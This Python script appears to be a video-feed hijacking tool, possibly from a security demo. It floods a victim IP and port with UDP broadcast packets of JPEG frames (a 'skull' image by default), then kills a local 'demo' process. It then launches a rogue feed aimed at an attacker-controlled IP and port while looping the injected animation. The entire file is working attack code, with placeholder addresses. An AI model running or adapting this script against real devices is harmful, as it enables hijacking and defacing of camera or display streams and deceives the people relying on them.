#!/usr/bin/env python3

VICTIM_IP = '255.255.255.255'
VICTIM_PORT = 4000

ATTACKER_IP = '255.255.255.255'
ATTACKER_PORT = 5000

from socket import *
from time import sleep
from glob import glob
from os import system
from sys import argv, exit

name = 'skull'
if len(argv) > 1:
    name = argv[1]

# Load images
images = []
for f in sorted(glob(f'images/{name}/*.jpg')):
    with open(f, mode='rb') as file:
        images.append(file.read())
if len(images) == 0:
    print(f"No images found in images/{name}")
    exit(0)

# Create broadcast socket
s = socket(AF_INET, SOCK_DGRAM)
s.bind(('', 0))
s.setsockopt(SOL_SOCKET, SO_BROADCAST, 1)

# Send a few flashes        
for i in range(0, 10):
    for j in range(0, i):
        s.sendto(images[0], (VICTIM_IP, VICTIM_PORT))
    sleep((10 - i) / 30.0)

# Kill the demo
system('pkill demo')

# Start rogue feed
# Sleep to avoid contention over USB
system(f'(sleep 3; ./demo {ATTACKER_IP} {ATTACKER_PORT}) &')

# Send animation on original feed
i = 0
while True:
    s.sendto(images[i], (VICTIM_IP, VICTIM_PORT))
    i = (i + 1) % len(images)
    sleep(0.2)
